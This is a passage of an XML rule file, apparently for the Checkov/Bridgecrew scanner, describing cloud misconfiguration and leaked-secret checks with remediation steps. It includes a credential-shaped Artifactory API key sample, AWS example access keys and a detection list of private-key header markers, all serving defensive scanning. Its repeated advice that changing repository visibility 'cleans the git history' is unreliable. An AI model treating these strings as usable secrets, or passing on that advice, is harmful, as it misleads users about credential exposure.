<p>SoftLayer Technologies, Inc. (now IBM Cloud) was a dedicated server, managed hosting, and cloud computing provider, founded in 2005 and acquired by IBM in 2013. SoftLayer initially specialized in hosting workloads for gaming companies and startups, but shifted focus to enterprise workloads after its acquisition.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>Step 1: Revoke the exposed secret.</p>
<p>Step 2: Clean the git history.</p>
<p>Step 3: Inspect IBM Cloud logs to ensure the key was not utilized during the compromised period.</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_15' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_15</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_15' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_87</key>
    <name>Ensure Amazon Redshift clusters are not publicly accessible</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-redshift-clusters-should-not-be-publicly-accessible"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-redshift-clusters-should-not-be-publicly-accessible"></div>AWS Redshift clusters should not be publicly accessible</div><a aria-label="Skip link to AWS Redshift clusters should not be publicly accessible" class="heading-anchor-icon fa fa-anchor" href="#aws-redshift-clusters-should-not-be-publicly-accessible"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Redshift clusters deployed within a VPC can be accessed from: the Internet, EC2 Instances outside the VPC via VPN, bastion hosts that you can launch in your public subnet, and using Amazon Redshift&#8217;s Publicly Accessible option. To use public connectivity, create your Redshift clusters with the <strong>Publicly Accessible</strong> option set to <strong>Yes</strong>, your Redshift clusters within a VPC will be fully accessible outside your VPC. If you do not want your Redshift clusters accessible from the Internet or outside your VPC, disable the Redshift <strong>Publicly Accessible</strong> option. If your AWS account allows you to create EC2-Classic clusters, the default option for <strong>Publicly Accessible</strong> is <strong>No</strong>.</p>
<p>Public access to a Redshift cluster can increase the opportunity for malicious activity such as SQL injections or Distributed Denial of Service (DDoS) attacks.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To change the policy using the AWS Console, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Navigate to the <strong>Redshift</strong> service.</li>
<li>Click on the identified Redshift cluster name.</li>
<li>In the menu options, click <strong>Cluster</strong>, then select <strong>Modify</strong>.</li>
<li>Ensure the value for <strong>Publicly Accessible</strong> is set to <strong>No</strong>.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_redshift_cluster</li>
<li><strong>Argument:</strong> publicly_accessible</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_redshift_cluster" "default" {
  cluster_identifier = "tf-redshift-cluster"
  ...
- publicly_accessible= "true"
+ publicly_accessible= "false"  
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::Redshift::Cluster</li>
<li><strong>Argument:</strong> Properties.PubliclyAccessible</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: "AWS::Redshift::Cluster"
    Properties:
      ...
-     PubliclyAccessible: true
+           PubliclyAccessible: false
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/public_9' target='_blank'> https://docs.bridgecrew.io/docs/public_9</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/public_9' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_DOCKER_5</key>
    <name>Ensure update instructions are not used alone in a Dockerfile</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="update-instructions-are-used-alone-in-a-dockerfile"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-update-instructions-are-used-alone-in-a-dockerfile"></div>Update instructions are used alone in a Dockerfile</div><a aria-label="Skip link to Update instructions are used alone in a Dockerfile" class="heading-anchor-icon fa fa-anchor" href="#update-instructions-are-used-alone-in-a-dockerfile"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>You should not use OS package manager update instructions such as <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">apt-get update</code> or <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">yum update</code> either alone or in a single line in the Dockerfile.</p>
<p>Adding update instructions in a single line on the Dockerfile will cause the update layer to be cached. When you then build any image later using the same instruction, this will cause the previously cached update layer to be used, potentially preventing any fresh updates from being applied to later builds.</p> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-update-instructions-are-not-used-alone-in-the-dockerfile' target='_blank'> https://docs.bridgecrew.io/docs/ensure-update-instructions-are-not-used-alone-in-the-dockerfile</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-update-instructions-are-not-used-alone-in-the-dockerfile' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_1</key>
    <name>Artifactory Credentials</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="artifactory-credentials"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-artifactory-credentials"></div>Artifactory Credentials</div><a aria-label="Skip link to Artifactory Credentials" class="heading-anchor-icon fa fa-anchor" href="#artifactory-credentials"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Artifactory is a Repository Manager that functions as a single access point organizing all of your binary resources including proprietary libraries, remote artifacts and other 3rd party resources.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Text</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="">apikey: AKCp5budTFpbypBqQbGJPz3pGCi28pPivfWczqjfYb9drAmd9LbRZbj6UpKFxJXA8ksWGc9fM
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>Step 1: Revoke the exposed secret.<br/>
The key can be revoked from the user profile or through the API.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Text</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="">## Revoke API Key
Description: Revokes the current user's API key
Since: 4.3.0
Usage: DELETE /api/security/apiKey
Produces: application/json

## Revoke User API Key
Description: Revokes the API key of another user
Since: 4.3.0
Security: Requires a privileged user (Admin only)
Usage: DELETE /api/security/apiKey/{username} 
Produces: application/json

## Revoke All API Keys
Description: Revokes all API keys currently defined in the system
Since: 4.3.0
Security: Requires a privileged user (Admin only)
Usage: DELETE /api/security/apiKey?deleteAll={0/1} 
Produces: application/json
</code></pre></div></div>
<p>Step 2: Clean the git history.<br/>
Go under the settings section of your GitHub project and chose the change visibility button at the bottom.</p>
<p>Step 3: Inspect Jfrog access logs to ensure the key was not utilized durring the compromised period.</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_1' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_2</key>
    <name>AWS Access Keys</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-access-keys"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-access-keys"></div>AWS Access Keys</div><a aria-label="Skip link to AWS Access Keys" class="heading-anchor-icon fa fa-anchor" href="#aws-access-keys"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>AWS Access Keys are long-term credentials for an IAM user or the AWS account root user. You can use access keys to sign programmatic requests to the AWS CLI or AWS API (directly or using the AWS SDK).</p>
<p>Access keys consist of two parts: an access key ID (for example, <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">AKIAIOSFODNN7EXAMPLE</code>) and a secret access key (for example, <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY</code>).</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>Step 1: Revoke the exposed secret.</p>
<ol>
<li>Sign in to the AWS Identity and Access Management (IAM) console as the root user.</li>
<li>Choose your account name on the navigation bar, and then choose My Security Credentials.</li>
<li>If you see a warning about accessing the security credentials, choose Continue to security credentials.</li>
<li>Expand the Access keys (access key ID and secret access key) section.</li>
<li>Choose Delete next to the access key that you want to delete.<br/>
In the confirmation box, choose Yes.</li>
</ol>
<p>Expand the "Access keys" section then click on the delete button.</p>
<p>Step 2: Clean the git history.<br/>
Go under the settings section of your GitHub project and chose the change visibility button at the bottom.</p>
<p>Step 3: Inspect AWS CloudTrail access logs to ensure the key was not utilized during the compromised period.</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_2' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_2</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_2' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_3</key>
    <name>Azure Storage Account Access Keys</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-storage-account-access-keys"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-storage-account-access-keys"></div>Azure Storage Account Access Keys</div><a aria-label="Skip link to Azure Storage Account Access Keys" class="heading-anchor-icon fa fa-anchor" href="#azure-storage-account-access-keys"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>When you create a storage account, Azure generates two 512-bit storage account access keys. These keys can be used to authorize access to data in your storage account via Shared Key authorization. Leaking this key can thus compromise the concerned data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>Step 1: Revoke the exposed secret.<br/>
To revoke a user delegation SAS, revoke the user delegation key to quickly invalidate all signatures associated with that key. To revoke a service SAS that is associated with a stored access policy, you can delete the stored access policy, rename the policy, or change its expiry time to a time that is in the past.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Text</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="">POST https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Storage/storageAccounts/{accountName}/revokeUserDelegationKeys?api-version=2021-04-01
</code></pre></div></div>
<p>Step 2: Clean the git history.<br/>
Go under the settings section of your GitHub project and chose the change visibility button at the bottom.</p>
<p>Step 3: Inspect Azure Activity Logs to ensure the key was not utilized during the compromised period.</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_3' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_3</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_3' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_4</key>
    <name>Basic Auth Credentials</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="basic-auth-credentials"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-basic-auth-credentials"></div>Basic Auth Credentials</div><a aria-label="Skip link to Basic Auth Credentials" class="heading-anchor-icon fa fa-anchor" href="#basic-auth-credentials"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Basic authentication is a simple authentication scheme built into the HTTP protocol. The client sends HTTP requests with the Authorization header that contains the word Basic word followed by a space and a base64-encoded string username:password. Leaked usernames and password can be used by attackers to attempt to authenticate to existing accounts and steal information they hold. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>Step 1: Revoke the exposed secret.</p>
<p>Step 2: Clean the git history.<br/>
Go under the settings section of your GitHub project and chose the change visibility button at the bottom.</p>
<p>Step 3: Inspect your application's access logs to ensure the key was not utilized during the compromised period.</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_4' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_4</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_4' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_6</key>
    <name>Base64 High Entropy String</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="base64-high-entropy-string"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-base-64-high-entropy-string"></div>Base64 High Entropy String</div><a aria-label="Skip link to Base64 High Entropy String" class="heading-anchor-icon fa fa-anchor" href="#base64-high-entropy-string"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Entropy is a concept used to assign a numerical score to how unpredictable a password is or the likelihood of highly random data in a string of characters. This policy calculates entropy levels using a Shannon Entropy calculator. The entropy levels of keys are important, as the more or less information required to determine unknown key variables can alter how difficult it is to crack. If a high-entropy string is detected, the string is printed to the screen.</p>
<p>This check scans the branch and evaluates the entropy value for both the base64 character set for every blob of text.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>Step 1: Revoke the exposed secret.<br/>
Start by understanding what services were impacted and refer to the corresponding API documentation to learn how to revoke and rotate the secret.</p>
<p>Step 2: Clean the git history.<br/>
Go under the settings section of your GitHub project and chose the change visibility button at the bottom.</p>
<p>Step 3: Check any relevant access logs to ensure the key was not utilized during the compromised period.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-terraform"></div>Fix - Terraform</div><a aria-label="Skip link to Fix - Terraform" class="heading-anchor-icon fa fa-anchor" href="#fix---terraform"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_glue_connection" "examplevpc" {
  connection_properties = {
    JDBC_CONNECTION_URL = "jdbc:mysql://${aws_rds_cluster.example.endpoint}/exampledatabase"
 -   PASSWORD            = "valuethatdoesntcontainsecretword"
    USERNAME            = "exampleusername"
  }

  name = "example"

  physical_connection_requirements {
    availability_zone      = aws_subnet.example.availability_zone
    security_group_id_list = [aws_security_group.example.id]
    subnet_id              = aws_subnet.example.id
  }
}
</code></pre></div></div>
<p>Don't hardcode the secret in the resource, pull in dynamically from a secret source of your choice e.g. AWS parameter store, and if already committed to source follow the git instructions stated previously.</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_6' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_6</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_6' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_7</key>
    <name>IBM Cloud IAM Key</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="ibm-cloud-iam-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-ibm-cloud-iam-key"></div>IBM Cloud IAM Key</div><a aria-label="Skip link to IBM Cloud IAM Key" class="heading-anchor-icon fa fa-anchor" href="#ibm-cloud-iam-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The IBM Cloud Identity and Access Management (IAM) service manages keys that can give access to infrastructure API and to resources.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>Step 1: Revoke the exposed secret.<br/>
To delete an API key, complete the following steps:</p>
<ol>
<li>In the console, go to Manage &gt; Access (IAM) &gt; API keys.</li>
<li>Identify the row of the API key that you want to delete, and select Delete from the Actions List of actions icon menu.</li>
<li>Then, confirm the deletion by clicking Delete.</li>
</ol>
<p>Step 2: Clean the git history.<br/>
Go under the settings section of your GitHub project and chose the change visibility button at the bottom.</p>
<p>Step 3: Check any relevant access logs to ensure the key was not utilized during the compromised period.</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_7' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_7</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_7' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_8</key>
    <name>IBM COS HMAC Credentials</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="ibm-cos-hmac-credentials"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-ibm-cos-hmac-credentials"></div>IBM COS HMAC Credentials</div><a aria-label="Skip link to IBM COS HMAC Credentials" class="heading-anchor-icon fa fa-anchor" href="#ibm-cos-hmac-credentials"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>IBM Cloud object storage (COS) is a format for storing unstructured data in the cloud.<br/>
HMAC credentials consist of an Access Key and Secret Key paired for use with S3-compatible tools and libraries that require authentication.</p>
<p>The IBM Cloud Object Storage API is a REST-based API for reading and writing objects. It uses IBM Cloud Identity and Access Management for authentication and authorization, and supports a subset of the S3 API for easy migration of applications to IBM Cloud.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>Step 1: Revoke the exposed secret.</p>
<p>Step 2: Clean the git history.<br/>
Go under the settings section of your GitHub project and chose the change visibility button at the bottom.</p>
<p>Step 3: Check IBM Cloud Object Storage Accesser server logs to ensure the key was not utilized during the compromised period.</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_8' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_8</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_8' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_9</key>
    <name>JSON Web Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="json-web-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-json-web-token"></div>JSON Web Token</div><a aria-label="Skip link to JSON Web Token" class="heading-anchor-icon fa fa-anchor" href="#json-web-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>JSON Web Tokens are an open, industry standard RFC 7519 method for representing claims securely between two parties.</p>
<p>Once issued, access tokens and ID tokens cannot be revoked in the same way as cookies with session IDs for server-side sessions. As a result, tokens should be issued for relatively short periods, and then refreshed periodically if the user remains active.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>Step 1: Reduce duration.<br/>
The most common solution is to reduce the duration of the JWT and revoke the refresh token so that the user can&#8217;t generate a new JWT.</p>
<p>Step 2: Clean the git history.<br/>
Go under the settings section of your GitHub project and chose the change visibility button at the bottom.</p>
<p>Step 3: Check your application access logs to ensure the key was not utilized during the compromised period.</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_9' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_9</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_9' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_13</key>
    <name>Private Key</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="private-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-private-key"></div>Private Key</div><a aria-label="Skip link to Private Key" class="heading-anchor-icon fa fa-anchor" href="#private-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This check detects private keys by determining whether commonly specified key attributes are present in the analyzed string.</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">DSA PRIVATE KEY
EC PRIVATE KEY
OPENSSH PRIVATE KEY
PGP PRIVATE KEY BLOCK
PRIVATE KEY
RSA PRIVATE KEY
SSH2 ENCRYPTED PRIVATE KEY
PuTTY-User-Key-File-2
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>Step 1: Revoke the exposed secret.</p>
<p>Step 2: Clean the git history.<br/>
Go under the settings section of your GitHub project and chose the change visibility button at the bottom.</p>
<p>Step 3: Inspect your application's access logs to ensure the key was not utilized during the compromised period.</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_13' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_13</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_13' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GITHUB_3</key>
    <name>Ensure GitHub organization security settings has IP allow list enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="github-organization-security-settings-does-not-have-ip-allow-list-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-git-hub-organization-security-settings-does-not-have-ip-allow-list-enabled"></div>GitHub organization security settings does not have IP allow list enabled</div><a aria-label="Skip link to GitHub organization security settings does not have IP allow list enabled" class="heading-anchor-icon fa fa-anchor" href="#github-organization-security-settings-does-not-have-ip-allow-list-enabled"></a></h1>
